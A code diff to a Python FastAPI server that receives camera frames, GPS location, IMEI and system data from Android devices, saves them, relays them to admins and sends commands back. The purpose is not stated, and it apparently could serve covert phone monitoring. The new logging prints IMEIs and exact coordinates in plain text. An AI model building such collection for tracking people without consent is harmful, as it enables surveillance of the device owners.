@@ -6,7 +6,8 @@ from typing import Dict, Optional, Set
 from fastapi import WebSocket, WebSocketDisconnect
 from backend.models import DeviceInfo, CameraFrame, LocationUpdate, DeviceCommand
 from backend.devices.manager import session_manager
-from backend.storage.files import storage
+from backend.storage.database import storage
+from backend.devices.registration import get_device_by_token
 import base64
 
 
@@ -44,13 +45,19 @@ class WebSocketManager:
             "device": session.dict()
         })
         
-        print(f"Device connected: {device_info.name} ({device_info.id})")
+        # Detailed logging
+        print(f"[DEVICE_CONNECT] Device connected: {device_info.name} (ID: {device_info.id})")
+        print(f"[DEVICE_CONNECT] Model: {device_info.manufacturer} {device_info.model}")
+        print(f"[DEVICE_CONNECT] Android: {device_info.android_version} (SDK: {device_info.sdk})")
+        print(f"[DEVICE_CONNECT] IMEI: {device_info.imei or 'N/A'}")
+        print(f"[DEVICE_CONNECT] Total connected devices: {len(self.device_connections)}")
         
         return conn
     
     async def disconnect_device(self, device_id: str):
         """Disconnect a device"""
         if device_id in self.device_connections:
+            device_name = self.device_connections[device_id].device_name
             del self.device_connections[device_id]
             session_manager.disconnect_device(device_id)
             
@@ -61,7 +68,8 @@ class WebSocketManager:
             })
             
             await storage.log_device_event(device_id, "disconnected")
-            print(f"Device disconnected: {device_id}")
+            print(f"[DEVICE_DISCONNECT] Device disconnected: {device_name} (ID: {device_id})")
+            print(f"[DEVICE_DISCONNECT] Total connected devices: {len(self.device_connections)}")
     
     async def connect_admin(self, websocket: WebSocket):
         """Connect an admin"""
@@ -96,6 +104,13 @@ class WebSocketManager:
             # Update last seen
             if device_id in self.device_connections:
                 self.device_connections[device_id].last_seen = datetime.utcnow()
+        else:
+            # Log unknown message types
+            device_name = "Unknown"
+            if device_id in self.device_connections:
+                device_name = self.device_connections[device_id].device_name
+            print(f"[UNKNOWN_MESSAGE] Received unknown message type '{msg_type}' from {device_name} (ID: {device_id})")
+            print(f"[UNKNOWN_MESSAGE] Message keys: {list(message.keys())}")
     
     async def _handle_camera_frame(self, device_id: str, message: Dict):
         """Handle camera frame from device"""
@@ -103,9 +118,22 @@ class WebSocketManager:
             frame = CameraFrame(**message)
             
             # Decode and save frame
-            frame_bytes = base64.b64decode(frame.data)
-            await storage.save_camera_frame(
-                device_id, frame.camera, frame_bytes, frame.timestamp
+            try:
+                frame_bytes = base64.b64decode(frame.data)
+                frame_size = len(frame_bytes)
+            except Exception as decode_error:
+                print(f"[CAMERA_FRAME_ERROR] Failed to decode Base64 for device {device_id}: {decode_error}")
+                print(f"[CAMERA_FRAME_ERROR] Base64 data length: {len(frame.data)}")
+                raise
+            
+            # Save to database
+            saved_frame = await storage.save_camera_frame(
+                device_id, 
+                frame.camera, 
+                frame_bytes,
+                frame.width,
+                frame.height,
+                frame.timestamp
             )
             
             # Update session
@@ -123,8 +151,19 @@ class WebSocketManager:
                 "height": frame.height
             })
             
+            # Log successful save
+            device_name = "Unknown"
+            if device_id in self.device_connections:
+                device_name = self.device_connections[device_id].device_name
+            print(f"[CAMERA_FRAME] Saved frame from {device_name} (ID: {device_id})")
+            print(f"[CAMERA_FRAME] Camera: {frame.camera}, Size: {frame_size} bytes, Resolution: {frame.width}x{frame.height}")
+            print(f"[CAMERA_FRAME] Timestamp: {frame.timestamp}, Frame ID: {saved_frame.id}")
+            
         except Exception as e:
-            print(f"Error handling camera frame: {e}")
+            import traceback
+            print(f"[CAMERA_FRAME_ERROR] Error handling camera frame from device {device_id}: {e}")
+            print(f"[CAMERA_FRAME_ERROR] Traceback: {traceback.format_exc()}")
+            print(f"[CAMERA_FRAME_ERROR] Message keys: {list(message.keys())}")
     
     async def _handle_location_update(self, device_id: str, message: Dict):
         """Handle location update from device"""
@@ -132,7 +171,13 @@ class WebSocketManager:
             location = LocationUpdate(**message)
             
             # Save location
-            await storage.save_location(device_id, location.dict())
+            saved_location = await storage.save_location(
+                device_id,
+                location.lat,
+                location.lon,
+                location.accuracy,
+                location.timestamp
+            )
             
             # Update session
             await session_manager.update_device_data(device_id, {
@@ -146,8 +191,20 @@ class WebSocketManager:
                 "location": location.dict()
             })
             
+            # Log successful save
+            device_name = "Unknown"
+            if device_id in self.device_connections:
+                device_name = self.device_connections[device_id].device_name
+            accuracy_str = f"{location.accuracy:.1f}m" if location.accuracy else "N/A"
+            print(f"[LOCATION_UPDATE] Saved location from {device_name} (ID: {device_id})")
+            print(f"[LOCATION_UPDATE] Coordinates: {location.lat:.6f}, {location.lon:.6f}, Accuracy: {accuracy_str}")
+            print(f"[LOCATION_UPDATE] Timestamp: {location.timestamp}, Location ID: {saved_location.id}")
+            
         except Exception as e:
-            print(f"Error handling location update: {e}")
+            import traceback
+            print(f"[LOCATION_UPDATE_ERROR] Error handling location update from device {device_id}: {e}")
+            print(f"[LOCATION_UPDATE_ERROR] Traceback: {traceback.format_exc()}")
+            print(f"[LOCATION_UPDATE_ERROR] Message: {message}")
     
     async def _handle_system_info(self, device_id: str, message: Dict):
         """Handle system info from device"""
@@ -160,7 +217,7 @@ class WebSocketManager:
             })
             
             # Save to log
-            await storage.log_device_event(device_id, "system_info", system_info)
+            saved_event = await storage.log_device_event(device_id, "system_info", system_info)
             
             # Broadcast to admins
             await self.broadcast_to_admins({
@@ -169,8 +226,24 @@ class WebSocketManager:
                 "data": system_info
             })
             
+            # Log successful save
+            device_name = "Unknown"
+            if device_id in self.device_connections:
+                device_name = self.device_connections[device_id].device_name
+            battery = system_info.get("battery_level", "N/A")
+            is_charging = system_info.get("is_charging", False)
+            memory = system_info.get("memory_usage", "N/A")
+            storage_usage = system_info.get("storage_usage", "N/A")
+            print(f"[SYSTEM_INFO] Saved system info from {device_name} (ID: {device_id})")
+            print(f"[SYSTEM_INFO] Battery: {battery}% {'(charging)' if is_charging else '(not charging)'}")
+            print(f"[SYSTEM_INFO] Memory usage: {memory}, Storage usage: {storage_usage}")
+            print(f"[SYSTEM_INFO] Timestamp: {system_info.get('timestamp', 'N/A')}, Event ID: {saved_event.id}")
+            
         except Exception as e:
-            print(f"Error handling system info: {e}")
+            import traceback
+            print(f"[SYSTEM_INFO_ERROR] Error handling system info from device {device_id}: {e}")
+            print(f"[SYSTEM_INFO_ERROR] Traceback: {traceback.format_exc()}")
+            print(f"[SYSTEM_INFO_ERROR] Message: {message}")
     
     async def send_command(self, device_id: str, command: DeviceCommand) -> bool:
         """Send command to device"""
